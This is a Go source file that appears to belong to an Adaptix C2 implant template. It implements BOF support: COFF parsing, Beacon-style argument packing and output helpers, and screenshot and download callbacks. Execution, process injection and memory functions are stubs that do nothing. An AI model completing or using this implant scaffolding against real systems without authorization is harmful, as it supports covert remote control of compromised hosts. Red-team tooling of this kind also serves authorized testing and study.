// __NAME__ Agent — BOF Loader (shared Go fallback)
//
// This file implements the BOF utility surface that the shared Go implant can
// realistically support in pure Go: COFF metadata parsing, BOF argument
// packing/parsing, Beacon output helpers, and Adaptix callback encoding.
//
// A full in-memory COFF executor would still require a native bridge (assembly,
// cgo, or a protocol-owned loader override) to transfer execution to relocated
// machine code. Instead of returning nil, the shared template now returns a
// structured BOF context with precise error/output messages.

package impl

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"strings"
	"sync"
	"unicode/utf16"

	"__NAME__/protocol"
)

const (
	SizeofFileHeader    = 20
	SizeofSectionHeader = 40
	SizeofRelocation    = 10
	SizeofSymbol        = 18

	ImageFileMachineI386  uint16 = 0x14c
	ImageFileMachineAMD64 uint16 = 0x8664

	ImageRelAMD64Absolute = 0x0000
	ImageRelAMD64Addr64   = 0x0001
	ImageRelAMD64Addr32NB = 0x0003
	ImageRelAMD64Rel32    = 0x0004
	ImageRelAMD64Rel32_1  = 0x0005
	ImageRelAMD64Rel32_2  = 0x0006
	ImageRelAMD64Rel32_3  = 0x0007
	ImageRelAMD64Rel32_4  = 0x0008
	ImageRelAMD64Rel32_5  = 0x0009

	ImageSymClassExternal uint8 = 2
	ImageSymClassStatic   uint8 = 3

	ImageScnCntUninitializedData uint32 = 0x00000080
	ImageScnMemExecute           uint32 = 0x20000000
	ImageScnMemRead              uint32 = 0x40000000
	ImageScnMemWrite             uint32 = 0x80000000

	maxPackedArgumentSize = 16 << 20
	maxUint32Value        = ^uint32(0)
)

type FileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type SectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLineNumbers uint32
	NumberOfRelocations  uint16
	NumberOfLineNumbers  uint16
	Characteristics      uint32
}

type Relocation struct {
	VirtualAddress   uint32
	SymbolTableIndex uint32
	Type             uint16
}

type CoffSymbol struct {
	Name               [8]byte
	Value              uint32
	SectionNumber      int16
	Type               uint16
	StorageClass       uint8
	NumberOfAuxSymbols uint8
}

type BofMsg = protocol.BofMsg

type BofContext struct {
	Msgs   []BofMsg
	output chan BofMsg
	mu     sync.Mutex
}

func NewBofContext() *BofContext {
	return &BofContext{output: make(chan BofMsg, 64)}
}

func (ctx *BofContext) emit(kind int, data []byte) {
	if ctx == nil {
		return
	}
	msg := BofMsg{Type: kind, Data: append([]byte(nil), data...)}
	select {
	case ctx.output <- msg:
	default:
		ctx.mu.Lock()
		ctx.Msgs = append(ctx.Msgs, msg)
		ctx.mu.Unlock()
	}
}

func (ctx *BofContext) emitf(kind int, format string, args ...interface{}) {
	ctx.emit(kind, []byte(fmt.Sprintf(format, args...)))
}

func (ctx *BofContext) Drain() {
	for {
		select {
		case msg := <-ctx.output:
			ctx.mu.Lock()
			ctx.Msgs = append(ctx.Msgs, msg)
			ctx.mu.Unlock()
		default:
			return
		}
	}
}

type DataParser struct {
	original []byte
	buffer   []byte
	length   int
	size     int
}

type FormatBuffer struct {
	original []byte
	buffer   []byte
	length   int
	size     int
}

var (
	kvStore     = make(map[string]interface{})
	kvStoreMu   sync.RWMutex
	gotMap      = make(map[string]uintptr)
	activeCtx   *BofContext
	activeCtxMu sync.Mutex
)

type SectionAlloc struct {
	Address         uintptr
	Size            int
	Characteristics uint32
}

func withActiveCtx(ctx *BofContext) func() {
	activeCtxMu.Lock()
	activeCtx = ctx
	activeCtxMu.Unlock()
	return func() {
		activeCtxMu.Lock()
		if activeCtx == ctx {
			activeCtx = nil
		}
		activeCtxMu.Unlock()
	}
}

func ObjectExecute(coffFile []byte, args []byte) *BofContext {
	ctx := NewBofContext()
	defer ctx.Drain()
	defer withActiveCtx(ctx)()

	header, err := parseFileHeader(coffFile)
	if err != nil {
		ctx.emitf(protocol.CALLBACK_ERROR, "BOF parse error: %v", err)
		return ctx
	}
	if err := validateSections(coffFile, header); err != nil {
		ctx.emitf(protocol.CALLBACK_ERROR, "BOF section validation failed: %v", err)
		return ctx
	}

	entry, err := findEntrySymbol(coffFile, header)
	if err != nil {
		ctx.emitf(protocol.CALLBACK_ERROR, "BOF symbol parsing failed: %v", err)
		return ctx
	}
	if entry == "" {
		ctx.emit(protocol.CALLBACK_ERROR, []byte("BOF entry symbol not found (expected go or _go)"))
		return ctx
	}

	if len(args) > 0 {
		var parser DataParser
		BeaconDataParse(&parser, args)
		_ = BeaconDataLength(&parser)
	}

	ctx.emitf(
		protocol.CALLBACK_ERROR,
		"BOF %q parsed successfully (%d section(s), machine %#x), but the shared Go template cannot execute relocated COFF entrypoints without a native loader bridge; use a protocol-owned/native BOF loader override",
		entry,
		header.NumberOfSections,
		header.Machine,
	)
	return ctx
}

func ObjectExecuteAsync(coffFile []byte, args []byte) *BofContext {
	ctx := NewBofContext()
	ctx.emit(protocol.CALLBACK_ERROR, []byte("async BOF execution is unavailable in the shared Go template"))
	if len(coffFile) > 0 || len(args) > 0 {
		ctx.emit(protocol.CALLBACK_OUTPUT, []byte("async BOF request accepted by the shared scaffold but not executed"))
	}
	ctx.Drain()
	return ctx
}

func parseFileHeader(coffFile []byte) (FileHeader, error) {
	if len(coffFile) < SizeofFileHeader {
		return FileHeader{}, errors.New("COFF file too short")
	}
	var header FileHeader
	if err := binary.Read(bytes.NewReader(coffFile[:SizeofFileHeader]), binary.LittleEndian, &header); err != nil {
		return FileHeader{}, err
	}
	if header.NumberOfSections == 0 {
		return FileHeader{}, errors.New("COFF file has no sections")
	}
	switch header.Machine {
	case ImageFileMachineI386, ImageFileMachineAMD64:
	default:
		return FileHeader{}, fmt.Errorf("unsupported machine type %#x", header.Machine)
	}
	return header, nil
}

func validateSections(coffFile []byte, header FileHeader) error {
	sectionTableEnd := SizeofFileHeader + int(header.NumberOfSections)*SizeofSectionHeader
	if sectionTableEnd > len(coffFile) {
		return errors.New("section table exceeds COFF size")
	}

	for i := 0; i < int(header.NumberOfSections); i++ {
		off := SizeofFileHeader + i*SizeofSectionHeader
		sec, err := parseSectionHeader(coffFile[off : off+SizeofSectionHeader])
		if err != nil {
			return fmt.Errorf("section %d: %w", i, err)
		}
		if sec.SizeOfRawData > 0 {
			end := int(sec.PointerToRawData) + int(sec.SizeOfRawData)
			if end < 0 || end > len(coffFile) {
				return fmt.Errorf("section %d raw data exceeds COFF size", i)
			}
		}
		if sec.NumberOfRelocations > 0 {
			relEnd := int(sec.PointerToRelocations) + int(sec.NumberOfRelocations)*SizeofRelocation
			if relEnd < 0 || relEnd > len(coffFile) {
				return fmt.Errorf("section %d relocations exceed COFF size", i)
			}
		}
	}

	if header.NumberOfSymbols > 0 {
		symbolTableEnd := int(header.PointerToSymbolTable) + int(header.NumberOfSymbols)*SizeofSymbol
		if symbolTableEnd > len(coffFile) {
			return errors.New("symbol table exceeds COFF size")
		}
		if symbolTableEnd+4 > len(coffFile) {
			return errors.New("string table header exceeds COFF size")
		}
	}
	return nil
}

func parseSectionHeader(data []byte) (SectionHeader, error) {
	if len(data) < SizeofSectionHeader {
		return SectionHeader{}, errors.New("short section header")
	}
	var sec SectionHeader
	if err := binary.Read(bytes.NewReader(data[:SizeofSectionHeader]), binary.LittleEndian, &sec); err != nil {
		return SectionHeader{}, err
	}
	return sec, nil
}

func parseSymbol(data []byte) (CoffSymbol, error) {
	if len(data) < SizeofSymbol {
		return CoffSymbol{}, errors.New("short symbol entry")
	}
	var sym CoffSymbol
	if err := binary.Read(bytes.NewReader(data[:SizeofSymbol]), binary.LittleEndian, &sym); err != nil {
		return CoffSymbol{}, err
	}
	return sym, nil
}

func findEntrySymbol(coffFile []byte, header FileHeader) (string, error) {
	if header.NumberOfSymbols == 0 {
		return "", errors.New("COFF symbol table missing")
	}

	symbolOffset := int(header.PointerToSymbolTable)
	stringOffset := symbolOffset + int(header.NumberOfSymbols)*SizeofSymbol
	if stringOffset+4 > len(coffFile) {
		return "", errors.New("COFF string table missing")
	}
	stringTableSize := int(binary.LittleEndian.Uint32(coffFile[stringOffset : stringOffset+4]))
	if stringTableSize < 4 || stringOffset+stringTableSize > len(coffFile) {
		return "", errors.New("invalid COFF string table")
	}
	stringTable := coffFile[stringOffset : stringOffset+stringTableSize]

	for idx := 0; idx < int(header.NumberOfSymbols); {
		off := symbolOffset + idx*SizeofSymbol
		sym, err := parseSymbol(coffFile[off : off+SizeofSymbol])
		if err != nil {
			return "", err
		}
		name, err := resolveSymbolName(sym, stringTable)
		if err != nil {
			return "", err
		}
		if sym.StorageClass == ImageSymClassExternal && (name == "go" || name == "_go") {
			return name, nil
		}
		idx += 1 + int(sym.NumberOfAuxSymbols)
	}
	return "", nil
}

func resolveSymbolName(sym CoffSymbol, stringTable []byte) (string, error) {
	if binary.LittleEndian.Uint32(sym.Name[:4]) == 0 {
		offset := int(binary.LittleEndian.Uint32(sym.Name[4:8]))
		if offset < 4 || offset >= len(stringTable) {
			return "", fmt.Errorf("invalid string table offset %d", offset)
		}
		nameData := stringTable[offset:]
		if end := bytes.IndexByte(nameData, 0); end >= 0 {
			nameData = nameData[:end]
		}
		return string(nameData), nil
	}
	return strings.TrimRight(string(sym.Name[:]), "\x00"), nil
}

func resolveExternalAddress(symbolName string) (uintptr, error) {
	if ptr, ok := gotMap[symbolName]; ok {
		return ptr, nil
	}
	return 0, fmt.Errorf("external symbol resolution for %q is unavailable in the shared Go BOF loader", symbolName)
}

func processRelocation(section *SectionAlloc, reloc *Relocation, symbolAddr uintptr) {
	_ = section
	_ = reloc
	_ = symbolAddr
}

func PackArgs(format string, args ...interface{}) ([]byte, error) {
	var body bytes.Buffer
	argIndex := 0

	for _, verb := range format {
		if argIndex >= len(args) {
			return nil, fmt.Errorf("missing argument for format %q at index %d", string(verb), argIndex)
		}
		arg := args[argIndex]
		argIndex++

		switch verb {
		case 'i':
			v, err := coerceInt32(arg)
			if err != nil {
				return nil, err
			}
			_ = binary.Write(&body, binary.LittleEndian, v)

		case 's':
			v, err := coerceInt16(arg)
			if err != nil {
				return nil, err
			}
			_ = binary.Write(&body, binary.LittleEndian, v)

		case 'z':
			v, err := coerceBytes(arg)
			if err != nil {
				return nil, err
			}
			v = append(v, 0)
			if uint64(len(v)) > uint64(maxUint32Value) {
				return nil, errors.New("packed string exceeds uint32 length")
			}
			_ = binary.Write(&body, binary.LittleEndian, uint32(len(v)))
			_, _ = body.Write(v)

		case 'Z':
			str, ok := arg.(string)
			if !ok {
				return nil, fmt.Errorf("format Z expects string, got %T", arg)
			}
			wide := utf16.Encode([]rune(str + "\x00"))
			buf := make([]byte, len(wide)*2)
			for i, r := range wide {
				binary.LittleEndian.PutUint16(buf[i*2:], r)
			}
			if uint64(len(buf)) > uint64(maxUint32Value) {
				return nil, errors.New("packed wide string exceeds uint32 length")
			}
			_ = binary.Write(&body, binary.LittleEndian, uint32(len(buf)))
			_, _ = body.Write(buf)

		case 'b':
			v, err := coerceBytes(arg)
			if err != nil {
				return nil, err
			}
			if len(v) > maxPackedArgumentSize {
				return nil, fmt.Errorf("binary argument exceeds %d bytes", maxPackedArgumentSize)
			}
			_ = binary.Write(&body, binary.LittleEndian, uint32(len(v)))
			_, _ = body.Write(v)

		default:
			return nil, fmt.Errorf("unsupported BOF argument verb %q", string(verb))
		}
	}

	if argIndex != len(args) {
		return nil, fmt.Errorf("too many BOF arguments: got %d, used %d", len(args), argIndex)
	}

	if uint64(body.Len()) > uint64(maxUint32Value) {
		return nil, errors.New("packed BOF argument buffer exceeds uint32 length")
	}

	out := make([]byte, 4+body.Len())
	binary.LittleEndian.PutUint32(out[:4], uint32(body.Len()))
	copy(out[4:], body.Bytes())
	return out, nil
}

func coerceInt32(v interface{}) (int32, error) {
	switch x := v.(type) {
	case int:
		return int32(x), nil
	case int8:
		return int32(x), nil
	case int16:
		return int32(x), nil
	case int32:
		return x, nil
	case int64:
		return int32(x), nil
	case uint:
		return int32(x), nil
	case uint8:
		return int32(x), nil
	case uint16:
		return int32(x), nil
	case uint32:
		return int32(x), nil
	case uint64:
		return int32(x), nil
	default:
		return 0, fmt.Errorf("cannot coerce %T to int32", v)
	}
}

func coerceInt16(v interface{}) (int16, error) {
	switch x := v.(type) {
	case int:
		return int16(x), nil
	case int8:
		return int16(x), nil
	case int16:
		return x, nil
	case int32:
		return int16(x), nil
	case int64:
		return int16(x), nil
	case uint:
		return int16(x), nil
	case uint8:
		return int16(x), nil
	case uint16:
		return int16(x), nil
	case uint32:
		return int16(x), nil
	default:
		return 0, fmt.Errorf("cannot coerce %T to int16", v)
	}
}

func coerceBytes(v interface{}) ([]byte, error) {
	switch x := v.(type) {
	case string:
		return []byte(x), nil
	case []byte:
		return append([]byte(nil), x...), nil
	default:
		return nil, fmt.Errorf("cannot coerce %T to []byte", v)
	}
}

func BeaconDataParse(parser *DataParser, buffer []byte) {
	if parser == nil {
		return
	}
	parser.original = append(parser.original[:0], buffer...)
	parser.buffer = nil
	parser.length = 0
	parser.size = 0
	if len(buffer) < 4 {
		return
	}
	dataLen := int(binary.LittleEndian.Uint32(buffer[:4]))
	body := buffer[4:]
	if dataLen <= len(body) {
		body = body[:dataLen]
	}
	parser.buffer = body
	parser.size = len(body)
}

func BeaconDataInt(parser *DataParser) int32 {
	if parser == nil || parser.length+4 > parser.size {
		return 0
	}
	v := int32(binary.LittleEndian.Uint32(parser.buffer[parser.length:]))
	parser.length += 4
	return v
}

func BeaconDataShort(parser *DataParser) int16 {
	if parser == nil || parser.length+2 > parser.size {
		return 0
	}
	v := int16(binary.LittleEndian.Uint16(parser.buffer[parser.length:]))
	parser.length += 2
	return v
}

func BeaconDataLength(parser *DataParser) int {
	if parser == nil {
		return 0
	}
	if parser.length >= parser.size {
		return 0
	}
	return parser.size - parser.length
}

func BeaconDataExtract(parser *DataParser) ([]byte, int) {
	if parser == nil || parser.length+4 > parser.size {
		return nil, 0
	}
	dataLen := int(binary.LittleEndian.Uint32(parser.buffer[parser.length:]))
	parser.length += 4
	if dataLen < 0 || parser.length+dataLen > parser.size {
		return nil, 0
	}
	data := append([]byte(nil), parser.buffer[parser.length:parser.length+dataLen]...)
	parser.length += dataLen
	return data, dataLen
}

func BeaconDataPtr(parser *DataParser, size int) []byte {
	if parser == nil || size < 0 || parser.length+size > parser.size {
		return nil
	}
	data := append([]byte(nil), parser.buffer[parser.length:parser.length+size]...)
	parser.length += size
	return data
}

func BeaconOutput(callbackType int, data []byte) {
	activeCtxMu.Lock()
	ctx := activeCtx
	activeCtxMu.Unlock()
	if ctx == nil {
		return
	}
	ctx.emit(callbackType, data)
}

func BeaconPrintf(callbackType int, format string, args ...interface{}) {
	BeaconOutput(callbackType, []byte(fmt.Sprintf(normalizePrintfFormat(format), args...)))
}

func normalizePrintfFormat(format string) string {
	replacer := strings.NewReplacer(
		"%ls", "%s",
		"%hs", "%s",
		"%S", "%s",
	)
	return replacer.Replace(format)
}

func BeaconFormatAlloc(format *FormatBuffer, maxSize int) {
	if format == nil {
		return
	}
	if maxSize < 0 {
		maxSize = 0
	}
	format.original = make([]byte, 0, maxSize)
	format.buffer = format.original
	format.length = 0
	format.size = maxSize
}

func BeaconFormatReset(format *FormatBuffer) {
	if format == nil {
		return
	}
	format.buffer = format.buffer[:0]
	format.length = 0
}

func BeaconFormatAppend(format *FormatBuffer, data []byte) {
	if format == nil || len(data) == 0 {
		return
	}
	format.buffer = append(format.buffer, data...)
	format.length = len(format.buffer)
	if format.length > format.size {
		format.size = format.length
	}
}

func BeaconFormatPrintf(format *FormatBuffer, fmtStr string, args ...interface{}) {
	BeaconFormatAppend(format, []byte(fmt.Sprintf(normalizePrintfFormat(fmtStr), args...)))
}

func BeaconFormatToString(format *FormatBuffer) (string, int) {
	if format == nil {
		return "", 0
	}
	return string(format.buffer), len(format.buffer)
}

func BeaconFormatFree(format *FormatBuffer) {
	if format == nil {
		return
	}
	format.original = nil
	format.buffer = nil
	format.length = 0
	format.size = 0
}

func BeaconFormatInt(format *FormatBuffer, value int32) {
	if format == nil {
		return
	}
	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, uint32(value))
	BeaconFormatAppend(format, buf)
}

func BeaconUseToken(token uintptr) bool { _ = token; return false }

func BeaconRevertToken() {}

func BeaconIsAdmin() bool { return false }

func BeaconAddValue(key string, value interface{}) {
	kvStoreMu.Lock()
	defer kvStoreMu.Unlock()
	kvStore[key] = value
}

func BeaconGetValue(key string) interface{} {
	kvStoreMu.RLock()
	defer kvStoreMu.RUnlock()
	return kvStore[key]
}

func BeaconRemoveValue(key string) bool {
	kvStoreMu.Lock()
	defer kvStoreMu.Unlock()
	if _, ok := kvStore[key]; !ok {
		return false
	}
	delete(kvStore, key)
	return true
}

func BeaconGetSpawnTo(x86 bool, buffer []byte) bool { _ = x86; _ = buffer; return false }

func BeaconSpawnTemporaryProcess(x86 bool, ignoreToken bool) (uint32, uintptr, uintptr, error) {
	_ = x86
	_ = ignoreToken
	return 0, 0, 0, errors.New("process spawning is unavailable in the shared Go BOF loader")
}

func BeaconInjectProcess(hProc uintptr, pid int, payload []byte, offset int, arg []byte) {
	_ = hProc
	_ = pid
	_ = payload
	_ = offset
	_ = arg
}

func BeaconInjectTemporaryProcess(hProcess uintptr, hThread uintptr, payload []byte, offset int, arg []byte) {
	_ = hProcess
	_ = hThread
	_ = payload
	_ = offset
	_ = arg
}

func BeaconCleanupProcess(hProcess uintptr, hThread uintptr) {
	_ = hProcess
	_ = hThread
}

func BeaconVirtualAlloc(addr uintptr, size uintptr, allocType uint32, protect uint32) uintptr {
	_ = addr
	_ = size
	_ = allocType
	_ = protect
	return 0
}

func BeaconVirtualAllocEx(hProcess uintptr, addr uintptr, size uintptr, allocType uint32, protect uint32) uintptr {
	_ = hProcess
	_ = addr
	_ = size
	_ = allocType
	_ = protect
	return 0
}

func BeaconVirtualProtect(addr uintptr, size uintptr, newProtect uint32) (uint32, bool) {
	_ = addr
	_ = size
	_ = newProtect
	return 0, false
}

func BeaconVirtualProtectEx(hProcess uintptr, addr uintptr, size uintptr, newProtect uint32) (uint32, bool) {
	_ = hProcess
	_ = addr
	_ = size
	_ = newProtect
	return 0, false
}

func BeaconVirtualFree(addr uintptr, size uintptr, freeType uint32) bool {
	_ = addr
	_ = size
	_ = freeType
	return false
}

func BeaconGetThreadContext(hThread uintptr, ctx uintptr) bool { _ = hThread; _ = ctx; return false }

func BeaconSetThreadContext(hThread uintptr, ctx uintptr) bool { _ = hThread; _ = ctx; return false }

func BeaconResumeThread(hThread uintptr) uint32 { _ = hThread; return 0 }

func BeaconOpenProcess(desiredAccess uint32, inheritHandle bool, pid uint32) uintptr {
	_ = desiredAccess
	_ = inheritHandle
	_ = pid
	return 0
}

func BeaconOpenThread(desiredAccess uint32, inheritHandle bool, tid uint32) uintptr {
	_ = desiredAccess
	_ = inheritHandle
	_ = tid
	return 0
}

func BeaconCloseHandle(h uintptr) bool { _ = h; return false }

func BeaconUnmapViewOfFile(addr uintptr) bool { _ = addr; return false }

func BeaconVirtualQuery(addr uintptr, buf uintptr, length uintptr) uintptr {
	_ = addr
	_ = buf
	_ = length
	return 0
}

func BeaconDuplicateHandle(srcProcess uintptr, srcHandle uintptr, tgtProcess uintptr, desiredAccess uint32, inheritHandle bool, options uint32) (uintptr, bool) {
	_ = srcProcess
	_ = srcHandle
	_ = tgtProcess
	_ = desiredAccess
	_ = inheritHandle
	_ = options
	return 0, false
}

func BeaconReadProcessMemory(hProcess uintptr, baseAddr uintptr, buf []byte) (int, bool) {
	_ = hProcess
	_ = baseAddr
	_ = buf
	return 0, false
}

func BeaconWriteProcessMemory(hProcess uintptr, baseAddr uintptr, buf []byte) (int, bool) {
	_ = hProcess
	_ = baseAddr
	_ = buf
	return 0, false
}

func BeaconDownload(filename string, data []byte) {
	_ = filename
	_ = data
}

func SwapEndianness(val uint32) uint32 {
	return (val>>24)&0xFF | (val>>8)&0xFF00 | (val<<8)&0xFF0000 | (val<<24)&0xFF000000
}

func ToWideChar(src string, maxChars int) []uint16 {
	if maxChars <= 0 {
		return nil
	}
	wide := utf16.Encode([]rune(src))
	if len(wide) >= maxChars {
		wide = wide[:maxChars-1]
	}
	return append(wide, 0)
}

func BeaconInformation(info uintptr) { _ = info }

func BeaconGetOutputData() ([]byte, int) { return nil, 0 }

func encodeTaggedBlob(tag string, data []byte) []byte {
	tagBytes := []byte(tag)
	out := make([]byte, 4+len(tagBytes)+len(data))
	binary.LittleEndian.PutUint32(out[:4], uint32(len(tagBytes)))
	copy(out[4:], tagBytes)
	copy(out[4+len(tagBytes):], data)
	return out
}

func AxAddScreenshot(note string, data []byte) {
	BeaconOutput(protocol.CALLBACK_AX_SCREENSHOT, encodeTaggedBlob(note, data))
}

func AxDownloadMemory(filename string, data []byte) {
	BeaconOutput(protocol.CALLBACK_AX_DOWNLOAD_MEM, encodeTaggedBlob(filename, data))
}

func BeaconDataStoreGetItem(index int) uintptr { _ = index; return 0 }

func BeaconDataStoreProtectItem(index int) { _ = index }

func BeaconDataStoreUnprotectItem(index int) { _ = index }

func BeaconDataStoreMaxEntries() int { return 0 }

func BeaconGetCustomUserData() uintptr { return 0 }

func BeaconRegisterThreadCallback(callback uintptr, data uintptr) {
	_ = callback
	_ = data
}

func BeaconUnregisterThreadCallback() {}

func BeaconWakeup() {}

func BeaconGetStopJobEvent() uintptr { return 0 }

func BeaconDisableBeaconGate() {}

func BeaconEnableBeaconGate() {}

func BeaconDisableBeaconGateMasking() {}

func BeaconEnableBeaconGateMasking() {}

func BeaconGetSyscallInformation() uintptr { return 0 }
